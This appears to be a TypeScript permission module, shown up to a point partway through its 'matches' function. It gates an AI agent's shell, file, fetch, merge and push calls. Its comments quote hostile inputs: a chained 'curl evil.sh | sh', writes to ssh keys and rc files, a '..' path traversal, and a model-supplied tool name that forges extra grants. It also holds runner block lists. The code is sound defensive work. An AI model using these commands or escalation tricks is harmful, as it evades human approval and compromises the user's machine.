/**
 * The permission vocabulary (HIVE-119).
 *
 * In `electron/shared` because the MCP host decides with it and main writes
 * grants with it, and those two may share nothing else. Pure by construction:
 * the fence is only a compile-time artifact if this module never grows a
 * runtime dependency.
 *
 * ## Why the ladder is computed here and stored in `meta`
 *
 * The renderer may take behaviour from `@shared` only as a type-only import,
 * so the card cannot call these functions. It is handed finished rungs —
 * label, caption and rule — as data on the ask, and renders them verbatim.
 *
 * That makes `meta.rungs` **display data and nothing else**. It travels on a
 * ledger entry whose `meta` the MCP host passes through unfiltered, so it is
 * model-supplied text by the time anyone reads it back. Main therefore
 * recomputes the ladder with `rungsFor(meta.tool, meta.input)` before it
 * writes anything (`electron/main/agents/permissions.ts`) — main may import
 * this module's behaviour freely; only the renderer is fenced to types.
 * Nothing may ever write a `rule` that came off an ask.
 */

import { mergeTarget } from './ledger-derive';
import { shellSegments } from './shell-words';

export type PermissionDecision =
  | { behavior: 'allow'; updatedInput: Record<string, unknown> }
  | { behavior: 'deny'; message: string };

/** What the fence decides about one call, before anyone is asked (HIVE-339). */
export type FenceVerdict =
  | { behavior: 'allow' }
  | { behavior: 'ask' }
  | { behavior: 'deny'; message: string };

export type RungId = 'allow-once' | 'allow-family' | 'allow-tool' | 'allow-project';

/** The merge card's project switch (HIVE-409): turn on auto-merge for the repo, and merge this one. */
export const ALLOW_PROJECT = 'allow-project';

export interface Rung {
  id: RungId;
  label: string;
  caption: string;
  /** What is appended to `tools:`. Absent on `allow-once`, which writes nothing. */
  rule?: string;
}

/**
 * What the model is told when its call is denied.
 *
 * Worded as an instruction, not a status, because the CLI feeds this back as
 * the tool *result*: a terse status gets read as output. In the conformance
 * probe a model handed "asked the overmind" reported it as the contents of the
 * file it had been trying to read.
 */
export const PERMISSION_DENY_MESSAGE =
  'Asked the overmind for permission. End your turn now — you will be woken when it is answered. Do not retry in this turn and do not route around it.';

/** Tools whose specifier is a path, and the argument it lives in. */
const PATH_TOOLS: Record<string, string> = {
  Read: 'file_path',
  Edit: 'file_path',
  Write: 'file_path',
  NotebookEdit: 'notebook_path',
};

const str = (input: Record<string, unknown>, key: string): string | undefined => {
  const value = input[key];
  return typeof value === 'string' && value !== '' ? value : undefined;
};

/** `a*b` → /^a.*b$/, with everything else escaped. `**` collapses to `*`. */
const globToRegExp = (pattern: string): RegExp => {
  const escaped = pattern
    .replace(/[.+?^${}()|[\]\\]/g, '\\$&')
    .replace(/\*+/g, '.*');
  return new RegExp(`^${escaped}$`);
};

/** A plausible hostname, optionally with a port. Nothing else is a host. */
const HOSTNAME = /^[a-z0-9]([a-z0-9.-]*[a-z0-9])?(:[0-9]{1,5})?$/;

/**
 * `https://github.com/a/b` → `github.com`. No URL parser, by design.
 *
 * The shape check is not cosmetic. This splits on `/`, `?` and `#` only, so
 * before it a "host" could carry anything else the URL held — a newline
 * included — and that string is what `familyRuleFor` composes into
 * `WebFetch(domain:…)` and `permissions.ts` then writes into `tools:`. See
 * {@link isSafeToCompose}: a newline there forges a second frontmatter key.
 * Anything that is not a hostname yields `undefined`, which fails closed
 * everywhere — `specifierTextFor` returns nothing, so `matches` refuses and
 * the call is asked about rather than granted.
 */
const hostOf = (url: string): string | undefined => {
  const afterScheme = url.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
  const host = afterScheme.split('/')[0]?.split('?')[0]?.split('#')[0]?.toLowerCase();
  return host === undefined || !HOSTNAME.test(host) ? undefined : host;
};

/**
 * Tools whose every call needs its own yes (retro B). `project_auto_merge`
 * grants unattended merging, so:
 * - its ladder is `once` and nothing else (`rungsFor`), because an
 *   `allow-tool` rung would write a standing grant into the agent's `tools:`;
 * - its one-shot names the exact project and switch (`specifierTextFor`);
 * - no rule but that literal matches it (`matches`), so a bare name, a glob or
 *   `*` in `HIVE_GRANTS` allows nothing.
 *
 * `waker.ts` also narrows `def.tools` with {@link namesTool}, because the CLI
 * grants what `--allowedTools` names without asking the fence.
 */
export const ONCE_ONLY_TOOLS: ReadonlySet<string> = new Set(['mcp__hive__project_auto_merge']);

/**
 * The MCP merge (HIVE-409): consent by the auto-merge rule (`mcp__hive__pr_merge(<owner>/<name>#*)`)
 * or a card, never a standing rule. Its specifier is `<owner>/<name>#<number>`.
 */
export const PR_MERGE_TOOL_NAME = 'mcp__hive__pr_merge';

/**
 * Tools a CLI must never allow on its own, so every call reaches the fence (HIVE-409): the once-only
 * tools, and the MCP merge, which the fence allows by the auto-merge rule alone. Not folded into
 * {@link ONCE_ONLY_TOOLS}: that set refuses every rule but a literal, and the auto-merge rule must work.
 */
export const FENCE_ONLY_TOOLS: ReadonlySet<string> = new Set([...ONCE_ONLY_TOOLS, PR_MERGE_TOOL_NAME]);

/** `owner/name` with nothing the glob or the `#` separator reads; the merge specifier's repository. */
const MERGE_REPO = /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/;

/**
 * Whether a `tools:` rule names `toolName` outright: the name itself, its MCP
 * server (`mcp__hive`), or any bare glob that covers it, `*` included. A
 * specifier or a literal never does.
 *
 * Wider than {@link matches} reads a glob, on purpose. `matches` decides what
 * the fence grants; this decides what `waker.ts` keeps out of
 * `--allowedTools`, which the CLI grants without asking the fence, and the CLI
 * reads the blanket as everything. Naming too much only costs a trip through
 * the fence; naming too little let `tools: ["*"]` merge unattended.
 */
export function namesTool(rule: string, toolName: string): boolean {
  if (rule === toolName) return true;
  if (!toolName.startsWith('mcp__') || rule.includes('(')) return false;
  if (rule === toolName.slice(0, toolName.indexOf('__', 'mcp__'.length))) return true;
  return rule.includes('*') && globToRegExp(rule).test(toolName);
}

/** The text a specifier is matched against, per tool. */
const specifierTextFor = (
  toolName: string,
  input: Record<string, unknown>,
): string | undefined => {
  if (ONCE_ONLY_TOOLS.has(toolName)) {
    // Fixed order, so one project and switch always read as the same text.
    const on = input['on'];
    if (typeof on !== 'boolean') return undefined;
    const project = str(input, 'project');
    const projects = input['projects'];
    if (project !== undefined && projects === undefined) return `project=${project};on=${String(on)}`;
    // HIVE-409: a list names every project, in order. `[^,;]` keeps one list from reading as another.
    if (
      project === undefined &&
      Array.isArray(projects) &&
      projects.length > 0 &&
      projects.every((entry) => typeof entry === 'string' && /^[^,;]+$/.test(entry))
    ) {
      return `projects=${projects.join(',')};on=${String(on)}`;
    }
    return undefined;
  }
  if (toolName === PR_MERGE_TOOL_NAME) {
    // HIVE-409: one PR, as `<owner>/<name>#<number>`; anything else composes nothing and matches nothing.
    const repo = str(input, 'repo');
    const number = input['number'];
    return repo !== undefined && MERGE_REPO.test(repo) && typeof number === 'number' && Number.isSafeInteger(number) && number > 0
      ? `${repo}#${String(number)}`
      : undefined;
  }
  if (toolName === 'Bash') return str(input, 'command');
  if (toolName === 'WebFetch') {
    const url = str(input, 'url');
    const host = url === undefined ? undefined : hostOf(url);
    return host === undefined ? undefined : `domain:${host}`;
  }
  const key = PATH_TOOLS[toolName];
  return key === undefined ? undefined : str(input, key);
};

/**
 * A shell control operator: `;`, `&`/`&&`, `|`/`||`, a redirection (`>`,
 * `>>`, `<`, and the process substitutions `<(` / `>(`), a backtick, `$(`,
 * or a newline.
 *
 * A `Bash(...)` specifier is matched against the *whole* command string and
 * nothing here splits on operators, so `Bash(git *)` compiles to `/^git .*$/`
 * — which `git status; curl evil.sh | sh` satisfies. The rule's own caption
 * promises "never asks again for git commands"; a chained `curl … | sh` is
 * not a git command, and the family rung is the one-click default, so this is
 * the widest reachable gap in the grammar.
 *
 * The fence therefore refuses to match *any* `Bash(...)` specifier against a
 * command that contains one. It is deliberately blunt rather than a shell
 * parser: this module is pure by construction and a half-correct tokeniser is
 * worse than none. The push fence (HIVE-407) does tokenise, with `shellSegments`, because it only ever
 * adds asks: a command the tokeniser cannot parse fails closed, and the text match stays beside it.
 *
 * Redirection is in the class for the same reason and it is not a lesser
 * case: `Bash(echo *)` and `Bash(cat *)` are ordinary one-click family
 * rungs, and both match `echo x > ~/.zshrc` and
 * `cat f > ~/.ssh/authorized_keys` — arbitrary file write, nowhere near a
 * caption reading "never asks again for echo commands".
 *
 * The trade-off, stated plainly: a legitimate `git log | head -5` or
 * `echo x > /tmp/note` now falls through to being asked instead of running
 * under a granted `Bash(git *)`.
 * That is the correct direction for a fence — the cost is one extra card, and
 * the alternative cost is an unreviewed `| sh`. Do not weaken this to a
 * prefix-only check: matching the head of the command and ignoring the tail
 * is exactly the hole this closes.
 */
const SHELL_CONTROL = /[;&|<>`\n]|\$\(/;

/** Any quoting but plain double quotes, or a line break: with one present, double-quote spans are not paired. */
const OTHER_QUOTING = /['\\$`\r\n]/;
const DOUBLE_QUOTED = /"[^"]*"/g;

/**
 * The text `SHELL_CONTROL` is tested against (HIVE-409). For the merge grant only, double-quoted spans
 * are blanked first: `--subject "Account & devices"` holds no control the shell would act on, and 13 of
 * 120 merged titles raised a card on an auto-merge project for that `&`. It is safe only while plain
 * double quotes are the command's only quoting: with no `'`, `\`, `$`, backtick or line break anywhere,
 * the shell pairs double quotes left to right exactly as this regex does, and expands nothing inside
 * them. Any other quoting and the whole text is tested, as before. An unclosed `"` is never blanked, so
 * whatever follows it is still tested.
 */
const controlText = (rule: string, command: string): string =>
  rule.startsWith('Bash(gh pr merge ') && !OTHER_QUOTING.test(command)
    ? command.replace(DOUBLE_QUOTED, '""')
    : command;

/**
 * Whether a candidate path walks upwards.
 *
 * `Read(/repo/src/**)` compiles to `/^\/repo\/src\/.*$/`, and
 * `/repo/src/../../.ssh/id_rsa` satisfies it while resolving nowhere near
 * `/repo/src`. Nothing in this module resolves paths — it cannot, being
 * dependency-free — so a candidate carrying a `..` segment is refused rather
 * than normalised. A path that genuinely needs `..` falls through to being
 * asked.
 */
const walksUp = (path: string): boolean => path.split('/').includes('..');

/** A built-in: `Bash`, `Read`, `ToolSearch`. */
const BARE_TOOL = /^[A-Za-z][A-Za-z0-9_]*$/;

/** A qualified MCP name: `mcp__hive__ledger_read`. */
/*
  `-` is admitted in both segments because real MCP tool names carry it —
  `mcp__plugin_context7_context7__query-docs` is an ordinary one — and without
  it `isToolName` rejects them, so the fence could describe no rung for such a
  call and `tools:` could not name one at all. Surfaced by HIVE-125, which
  made the predicate load-bearing on the deny path as well as the grant path.

  Safe on both roads it feeds: the glob DSL reads only `,` and `*`, and a
  hyphen is an ordinary character in a YAML flow-sequence item, so it can
  neither widen a rule nor close `tools:` early.
*/
const MCP_TOOL = /^mcp__[A-Za-z0-9_-]+__[A-Za-z0-9_-]+$/;

/**
 * Whether `value` is the name of a tool — the boundary check on `meta.tool`.
 *
 * This is not defensive noise, and deleting it reopens two escalations that
 * were both live on this branch. `meta` on `ledger_ask` is free-form and the
 * MCP host passes it through unfiltered, so **`meta.tool` is a string the
 * model chose**, and both grant roads used to take it verbatim:
 *
 * - `meta.tool: '*'` — no exact rule can be composed from it, so the one-shot
 *   road fell back to the bare name and pushed `'*'` into `HIVE_GRANTS`,
 *   where `matches` treats it as everything. One click on **once** — the
 *   least dangerous button on the card — and the next wake was unfenced.
 * - `meta.tool: 'Bash]\ntools: [Write'` — `rungsFor` echoes its argument as
 *   the `allow-tool` rule, `patchFrontmatter` writes it unescaped, and the
 *   file gains a *second* `tools:` key that `readFrontmatter` lets win. A
 *   click on a rung labelled "all Bash" permanently granted `Write`. Any
 *   frontmatter key is settable that way, which is why the fix is a shape
 *   check here rather than an escape at the writer.
 *
 * The grammar admits no `:` either, which is what keeps {@link
 * LITERAL_PREFIX}'s three-part rule unambiguous and keeps `rungsFor` from
 * ever producing a rule that looks like a one-shot literal.
 */
export function isToolName(value: unknown): value is string {
  if (typeof value !== 'string') return false;
  return value.startsWith('mcp__') ? MCP_TOOL.test(value) : BARE_TOOL.test(value);
}

/**
 * The sentinel on a one-shot rule: `literal:<tool>:<specifier text>`.
 *
 * A one-shot grant never enters `AGENT.md`. It travels as JSON in
 * `HIVE_GRANTS` and is parsed back by `readGrants`, so the glob DSL's comma
 * ban and its wildcard semantics are borrowed constraints on that channel,
 * not real ones — and borrowing them is what forced the old bare-tool
 * fallback, which announced its widening in a ledger event written *after*
 * the click while the card still read "runs this once". Consent taken
 * against a false caption is not consent.
 *
 * So a one-shot says what it means: this tool, this exact specifier text,
 * compared with `===`. It never appears in `tools:` — `onAnswer` writes only
 * rules that came out of `rungsFor`, and `isToolName` forbids the `:` that
 * would be needed to forge one.
 */
const LITERAL_PREFIX = 'literal:';

/** First words that read and never run anything; `rg` (`--pre`) and `sed` (`e`) can run a program, so they are absent. */
const READ_ONLY_TOOLS = new Set(['grep', 'cat']);
/** Raw text that voids the read-only exemption, whatever the tokeniser made of it; see {@link readsOnly}. */
const UNSAFE_FOR_EXEMPTION = /[$`>]|<</;

/**
 * A lone `grep` or `cat` that only *mentions* a merge or a push (HIVE-407): reviewing the fence's own
 * code raised a card for it seven times in one audit week. One command and nothing else, since an
 * operator, a substitution or a process substitution each parse as a second command. The raw text must
 * also hold no `$` or backtick (bash runs a substitution hidden in an arithmetic subscript, which the
 * tokeniser reads as escaped text), no `>` (a write into a hook or rc file is not a read), and no `<<`
 * (the tokeniser skips a heredoc body as data, and the exemption is not meant to cover one).
 */
const readsOnly = (command: string): boolean => {
  const segments = shellSegments(command);
  return segments?.length === 1 && READ_ONLY_TOOLS.has(segments[0][0]) && !UNSAFE_FOR_EXEMPTION.test(command);
};

/**
 * A command that merges a pull request: `gh pr merge`, a REST merge through `gh api` (a pull's
 * `/pulls/<n>/merge` or the branch-merge `repos/<o>/<r>/merges`), or the GraphQL mutations that merge,
 * auto-merge or queue one (`mergePullRequest`, `enablePullRequestAutoMerge`, `enqueuePullRequest`,
 * `addPullRequestToMergeQueue`).
 *
 * The merge is `ship`'s one consent checkpoint (HIVE-166), and an agent may hold all of Bash, so no wide
 * rule may grant it: only the auto-merge grant (`Bash(gh pr merge * --repo <owner>/<name>)`), a rule the
 * user wrote with the same `gh pr merge ` prefix, or a one-shot literal. {@link runsMerge} decides
 * from the tokenised command, so a grep pattern or a commit message that only spells it is not a merge;
 * this text match judges a command the tokeniser cannot parse, and a word a runner (`bash -c`) is handed. A backslash-newline between `pr` and `merge` is a
 * continuation (HIVE-407).
 * shortcut: it catches the merge a skill spells, not one hidden behind a shell variable or a raw `curl`;
 * upgrade to running agents without a GitHub token able to merge if that ever matters.
 */
const PR_MERGE =
  /\bgh\b[\s\S]*?(\bpr(?:\s|\\\r?\n)+merge\b|\/pulls\/[^\s/]+\/merge\b|\brepos\/[^\s/]+\/[^\s/]+\/merges\b|\bmergePullRequest\b|\benablePullRequestAutoMerge\b|\benqueuePullRequest\b|\baddPullRequestToMergeQueue\b)/;

/** The merge spellings `gh api` takes, one word at a time: a REST path or a GraphQL mutation. */
const GH_API_MERGE =
  /\/pulls\/[^\s/]+\/merge\b|\brepos\/[^\s/]+\/[^\s/]+\/merges\b|\bmergePullRequest\b|\benablePullRequestAutoMerge\b|\benqueuePullRequest\b|\baddPullRequestToMergeQueue\b/;
/** `gh` options that take the next word as their value. */
const GH_VALUE_OPTIONS = new Set(['--repo', '-R']);

/** A word that may name gh: `gh`, a path to it, or one the shell fills in (`$GH`, `$(which gh)`). */
const namesGh = (word: string): boolean => word === 'gh' || word.endsWith('/gh') || word.includes('$');

/** Whether the words from `gh` (at `at`) on merge: `gh [opts] pr [opts] merge`, or a merge through `gh api`. */
const ghMerges = (words: readonly string[], at: number): boolean => {
  let i = at + 1;
  const skipOptions = (): void => {
    while (i < words.length && words[i]!.startsWith('-')) i += GH_VALUE_OPTIONS.has(words[i]!) ? 2 : 1;
  };
  skipOptions();
  if (words[i] === 'api') return words.slice(i + 1).some((word) => GH_API_MERGE.test(word));
  if (words[i] !== 'pr') return false;
  i += 1;
  skipOptions();
  return words[i] === 'merge';
};

/**
 * Commands that run text they are handed as code: shells, `eval`, remote and prefix runners, and the
 * interpreters and editors with an execute form (`python -c`, `perl -e`, `sed 'e …'`, `awk 'system()'`).
 */
const RUNS_TEXT = new Set([
  'bash', 'sh', 'zsh', 'dash', 'ksh', 'fish', 'eval', 'source', '.', 'ssh', 'su', 'sudo', 'doas', 'env',
  'xargs', 'nohup', 'time', 'timeout', 'nice', 'watch', 'exec', 'command', 'script', 'parallel', 'flock',
  'sed', 'gsed', 'awk', 'gawk', 'mawk', 'nawk', 'perl', 'ruby', 'node', 'deno', 'bun', 'php', 'lua',
  'osascript', 'expect', 'tclsh', 'make', 'csh', 'tcsh', 'pwsh', 'powershell', 'tmux', 'screen', 'npx', 'busybox',
]);

/** Shells and shell runners that run what they read on stdin: a heredoc, a here-string, a pipe. */
const READS_STDIN = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'fish', 'ssh', 'su', 'sudo', 'doas', 'source', 'script']);

const baseName = (word: string): string => word.slice(word.lastIndexOf('/') + 1);
const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

/**
 * Whether a simple command's words can run a string it was given as a command. Every word counts, not
 * only the first, so a runner behind a wrapper or a keyword (`caffeinate bash -c`, `{ bash -c`,
 * `then sh -c`) is seen; `.` counts only as the command itself, since as an argument it is a path.
 */
const runsText = (words: readonly string[]): boolean => {
  const at = words.findIndex((word) => !ASSIGNMENT.test(word));
  if (at === -1) return false;
  const head = words[at]!;
  if (head.includes('$')) return true;
  const runs = words.slice(at).some((word, j) => {
    const base = baseName(word);
    return (j === 0 || base !== '.') && (RUNS_TEXT.has(base) || /^python[\d.]*$/.test(base));
  });
  if (runs) return true;
  // `git -c alias.x='!…'` and `--config-env` define a command and run it in the same breath.
  return baseName(head) === 'git' && words.some((word) => word === '-c' || word.startsWith('--config-env'));
};

/**
 * Whether the merge text sits where the tokeniser cannot see it run: in a heredoc, here-string or pipe
 * feeding a shell (`bash <<EOF`, `echo … | bash`), or in a variable a runner expands (`X=…; $X`,
 * `eval "$X"`). Those words are data to the tokeniser, so the whole text decides, as the fence's old
 * text match did. An interpreter fed a heredoc (`python3 - <<EOF`) is not a shell and stays judged on
 * its words: see the shortcut on {@link runsMerge}.
 */
const hidesMerge = (command: string, segments: readonly (readonly string[])[]): boolean =>
  PR_MERGE.test(command) &&
  segments.some(
    (words) =>
      (/<<|\|/.test(command) && words.some((word) => READS_STDIN.has(baseName(word)))) ||
      (runsText(words) && words.some((word) => word.includes('$'))),
  );

/** Whether one simple command, as the tokeniser split it, runs a merge. */
const segmentMerges = (words: readonly string[]): boolean =>
  words.some(
    (word, i) =>
      (namesGh(word) && ghMerges(words, i)) ||
      // Text the shell still expands (an arithmetic subscript, a substitution) and that spells a merge.
      (/[$`]/.test(word) && PR_MERGE.test(word)),
  ) || (runsText(words) && words.some((word) => PR_MERGE.test(word)));

/**
 * Whether a command **runs** a merge, rather than mentions one (HIVE-409 follow-up). The text match
 * alone raised a card for a grep pattern, a commit message and a Python heredoc that edits a test,
 * because each spells `gh pr merge`, eight times in one day for the builder, which never merges.
 *
 * Each command the tokeniser finds is judged on its own words, which also catches two spellings the
 * text match missed, `gh pr --repo a/b merge` and `$GH pr merge`. It counts as a merge when `gh` (or a word the shell fills in) is
 * followed by `pr merge` or a `gh api` merge, when a still-expanded word spells one, or when a command
 * that runs text it is handed (`bash -c`, `eval`, `ssh`, `python -c`, `sed`) carries one. A command the
 * tokeniser cannot parse is a merge if the text says so, as before.
 * shortcut: a heredoc body is data to the tokeniser, so `python3 - <<EOF` holding a script that shells
 * out to a merge is not seen, nor is a merge behind a Makefile target or a git alias in a config file.
 * Those join the `curl` case already named on PR_MERGE: the fence stops the merge a workflow spells,
 * not a determined one. The Write tool writes such a script unfenced anyway.
 */
const runsMerge = (command: string): boolean => {
  const segments = shellSegments(command);
  return segments === undefined
    ? PR_MERGE.test(command)
    : segments.some(segmentMerges) || hidesMerge(command, segments);
};

export const isPrMerge = (toolName: string, input: Record<string, unknown>): boolean =>
  toolName === PR_MERGE_TOOL_NAME || (toolName === 'Bash' && runsMerge(str(input, 'command') ?? ''));

/** The rule `auto-merge.ts` grants the shipper for a project with auto-merge on; group 1 is the slug. */
const AUTO_MERGE_RULE = /^Bash\(gh pr merge \* --repo ([A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+)\)$/;

/** `gh pr merge` options that take no value. */
const MERGE_SWITCHES = new Set([
  '--admin', '--auto', '--delete-branch', '-d', '--disable-auto', '--merge', '-m', '--rebase', '-r', '--squash', '-s',
]);
/** `gh pr merge` options that take a value, attached (`--x=v`, `-xv`) or as the next word, as gh's flag parser reads them. */
const MERGE_VALUES = new Set([
  '--author-email', '-A', '--body', '-b', '--body-file', '-F', '--match-head-commit', '--subject', '-t', '--repo', '-R',
]);

/**
 * The repository a plain `gh [-R r] pr [-R r] merge <number> [options]` names, read the way gh's flag
 * parser reads it: a value-taking option consumes its value whatever it looks like, so a `--repo=` spelled
 * inside `--body` is body text (PR #281 F1). `undefined`, failing closed, unless `gh` is the command
 * itself (not an argument to `find -exec` or `xargs`, F5), the one selector is a PR number (a URL picks
 * its own repository, F3), every option is one `gh pr merge` knows, and a repository is named. The last
 * `--repo` wins, as in gh.
 */
/** `{a,b}` or `{1..3}`: bash expands it into several words, which the tokeniser keeps as one. */
const BRACE_EXPANSION = /\{[^{}]*(?:,|\.\.)[^{}]*\}/;
/** A redirection: the tokeniser drops it, so the raw text is the only place it shows. */
const REDIRECT = /[<>]/;

const plainMergeRepo = (words: readonly string[]): string | undefined => {
  const head = words[0];
  if (head === undefined || !(head === 'gh' || head.endsWith('/gh'))) return undefined;
  // A word the shell still changes: a substitution, or brace expansion, which can add a `--repo` (#281 R2).
  // A wildcard in an option-like word can expand to a file named like an option (`-R*/x` → `-Revil/x`).
  if (words.some((word) => /[$`]/.test(word) || BRACE_EXPANSION.test(word) || /^-.*[*?[]/.test(word))) return undefined;
  const expected = ['pr', 'merge'];
  let repo: string | undefined;
  let selector: string | undefined;
  let operands = false;
  for (let i = 1; i < words.length; i++) {
    const word = words[i]!;
    const inMerge = expected.length === 0;
    if (operands || !word.startsWith('-') || word === '-') {
      if (!inMerge) {
        if (word !== expected.shift()) return undefined;
        continue;
      }
      if (selector !== undefined || !/^\d+$/.test(word)) return undefined;
      selector = word;
      continue;
    }
    if (word === '--') {
      if (!inMerge) return undefined;
      operands = true;
      continue;
    }
    const long = word.startsWith('--');
    const eq = word.indexOf('=');
    const name = long ? (eq === -1 ? word : word.slice(0, eq)) : word.slice(0, 2);
    const attached = long ? (eq === -1 ? undefined : word.slice(eq + 1)) : word.length > 2 ? word.slice(2) : undefined;
    const isRepo = name === '--repo' || name === '-R';
    if (!isRepo && !(inMerge && (MERGE_SWITCHES.has(name) || MERGE_VALUES.has(name)))) return undefined;
    if (MERGE_SWITCHES.has(name)) {
      // `-sd` or `--squash=true`: a cluster or a spelling this reader does not follow.
      if (attached !== undefined) return undefined;
      continue;
    }
    let value = attached;
    if (value === undefined) {
      value = words[i + 1];
      i += 1;
      if (value === undefined) return undefined;
    }
    if (isRepo) repo = value;
  }
  return expected.length === 0 && selector !== undefined ? repo : undefined;
};

/**
 * Whether the project's auto-merge consent covers this whole command (HIVE-409 follow-up): a project
 * with auto-merge on merges unattended, however the shipper spells the call. The glob rule alone missed
 * a subject quoting `&` or `;` (13 of 120 titles), a merge chained to `gh pr view`, and `-R` or
 * `--repo=`, each a card on a project that had said yes.
 *
 * Read off the tokeniser, so quoting is gone before anything is compared. Every `gh pr merge` in the
 * command must name, as its last repository, one an auto-merge rule names, with no word the shell
 * still fills in. Any other command beside it needs all of Bash (`Bash` or `*`), which the shipper
 * holds. A merge through `gh api`, through a runner (`bash -c`), or behind a dynamic word is left to
 * the card: the switch consents to the merge `merge-pr` spells, not to every spelling of one.
 */
const autoMergeCovers = (command: string, grants: readonly string[]): boolean => {
  const slugs = new Set(grants.flatMap((rule) => AUTO_MERGE_RULE.exec(rule)?.[1] ?? []));
  if (slugs.size === 0) return false;
  const segments = shellSegments(command);
  if (segments === undefined) return false;
  const allBash = grants.includes('Bash') || grants.includes('*');
  let merges = 0;
  if (hidesMerge(command, segments)) return false;
  /*
    What rides beside the merge is held to every gate bare `Bash` is (#281 R2): a default-branch push
    asks, as it did before this read existed. A redirection writes a file, so it needs all of Bash too.
  */
  if (isDefaultBranchPush('Bash', { command }) || (!allBash && REDIRECT.test(command))) return false;
  for (const words of segments) {
    if (!words.some((word, i) => namesGh(word) && ghMerges(words, i))) {
      if (!allBash || segmentMerges(words)) return false;
      continue;
    }
    const repo = plainMergeRepo(words);
    if (repo === undefined || !slugs.has(repo)) return false;
    merges += 1;
  }
  return merges > 0;
};

/**
 * A `git push` that writes the default branch (HIVE-395, HIVE-407). This text match is one half of
 * {@link pushesDefault}'s union: together they catch a target of `main` or `master`, bare, as a
 * refspec's destination (`HEAD:main`), forced (`+main`), as `refs/heads/main` or `heads/main`, deleted
 * (`:main`, `--delete main`), a wildcard destination, a destination the shell fills in (`"$BRANCH"`),
 * or a push swept up by `--all`, `--mirror` or `--branches`.
 *
 * It reaches what a merge reaches with no PR at all, so it is fenced the way {@link isPrMerge} is: no
 * wide rule grants it, only a one-shot literal, and anywhere in the command for the same reason. A
 * local `main:feature` (main pushed to a feature branch), `feat/main` and `main-v2` stay allowed; a
 * commit message reading "push to main" asks, which fails closed. A backslash-newline is a line
 * continuation, not a new command, so the gaps cross it (`git push origin \<newline>  main`) and a
 * target may end at one (`main\<newline>  --force`).
 * shortcut: the default branch is `main` or `master` by name, not the repository's own; pass each
 * project's real default branch into the fence if one ever differs.
 * shortcut: a `git push` with no refspec, or `git push origin HEAD`, while on the default branch is not
 * caught, nor is a ref written through `gh api`; the fence is pure and cannot read the current branch.
 */
const DEFAULT_BRANCH_PUSH =
  /\bgit\b(?:[^;&|\n]|\\\r?\n)*?\bpush\b(?:[^;&|\n]|\\\r?\n)*?(\s--(?:all|mirror)\b|[\s:+'"](?:refs\/heads\/)?(?:main|master)(?=['"\s;&|)]|\\\r?\n|$))/;

/** Git's global options that take the next word as their value (`git -C <dir> push`). */
const GIT_VALUE_OPTIONS = new Set([
  '-C',
  '-c',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--config-env',
  '--attr-source',
]);
/** `git push` options that take the next word as their value. */
const PUSH_VALUE_OPTIONS = new Set(['-o', '--push-option', '--repo', '--receive-pack', '--exec']);
/** `git push` options that push every branch, the default one included. */
const PUSH_EVERY_BRANCH = new Set(['--all', '--mirror', '--branches']);

/** Whether a refspec's destination is the default branch, a wildcard, or a value the shell fills in. */
const writesDefaultBranch = (refspec: string): boolean => {
  const spec = refspec.startsWith('+') ? refspec.slice(1) : refspec;
  const colon = spec.indexOf(':');
  const destination = (colon === -1 ? spec : spec.slice(colon + 1)).replace(/^(?:refs\/)?heads\//, '');
  return destination === 'main' || destination === 'master' || /[*$?[{`]/.test(destination);
};

/** Whether one simple command, read from its `git` word on, pushes the default branch. */
const pushesDefaultBranch = (words: string[], git: number): boolean => {
  let i = git + 1;
  while (i < words.length && words[i].startsWith('-')) i += GIT_VALUE_OPTIONS.has(words[i]) ? 2 : 1;
  if (words[i] !== 'push') return false;
  let positional = false;
  for (i++; i < words.length; i++) {
    const word = words[i];
    if (!positional && word === '--') positional = true;
    else if (!positional && PUSH_EVERY_BRANCH.has(word)) return true;
    else if (!positional && PUSH_VALUE_OPTIONS.has(word)) i++;
    else if (!positional && word.startsWith('-')) continue;
    // Every positional is checked, the repository too: cheaper than knowing what `--repo` moved.
    else if (writesDefaultBranch(word)) return true;
  }
  return false;
};

/** A word that may name git: `git`, a path to it, or one the shell fills in (`$G`, `$(which git)`). */
const namesGit = (word: string): boolean => word === 'git' || word.endsWith('/git') || word.includes('$');
/** A word that reads as a command of its own: a wrapper's argument (`bash -c '…'`, `ssh host '…'`, `eval "…"`). */
const READS_AS_COMMAND = /[\s;&|<>`]|\$\(/;
/** How deep a wrapper's argument is read again: `bash -c "sh -c '…'"` is two. */
const WRAPPER_DEPTH = 3;

/**
 * The union, so the fence only ever widens (HIVE-407): the tokenised refspec check sees through quoting,
 * redirects and operators; the text match above keeps catching what the tokeniser cannot follow; a word
 * that reads as a command (a wrapper's argument) is checked again as one; and a top-level command the
 * tokeniser cannot parse asks if it mentions a push. A wrapper's unparseable argument is left to the text
 * match, since a quoted PR body reading "it's ready to push" is prose, not a push.
 */
const pushesDefault = (command: string, depth = 0): boolean => {
  if (DEFAULT_BRANCH_PUSH.test(command)) return true;
  const segments = shellSegments(command);
  if (segments === undefined) return depth === 0 && /\bpush\b/.test(command);
  return segments.some((words) =>
    words.some(
      (word, i) =>
        (namesGit(word) && pushesDefaultBranch(words, i)) ||
        (depth < WRAPPER_DEPTH && READS_AS_COMMAND.test(word) && pushesDefault(word, depth + 1)),
    ),
  );
};

export const isDefaultBranchPush = (toolName: string, input: Record<string, unknown>): boolean => {
  const command = str(input, 'command') ?? '';
  return toolName === 'Bash' && pushesDefault(command) && !readsOnly(command);
};

export function matches(
  rule: string,
  toolName: string,
  input: Record<string, unknown>,
): boolean {
  if (rule === '') return false;

  /*
    Checked first, and deliberately short of everything below it. The
    shell-operator and `..` guards exist to stop a *pattern* matching more
    than it names; a literal names exactly one call, so there is nothing for
    them to catch and applying them would only make a grant the user clicked
    fail to fire.
  */
  if (rule.startsWith(LITERAL_PREFIX)) {
    const rest = rule.slice(LITERAL_PREFIX.length);
    const sep = rest.indexOf(':');
    if (sep === -1) return false;
    if (rest.slice(0, sep) !== toolName) return false;
    return specifierTextFor(toolName, input) === rest.slice(sep + 1);
  }

  // Only the literal above may allow a once-only tool: see ONCE_ONLY_TOOLS.
  if (ONCE_ONLY_TOOLS.has(toolName)) return false;

  // Only a rule that names the merge may allow one, each on its own path: see PR_MERGE and PR_MERGE_TOOL_NAME.
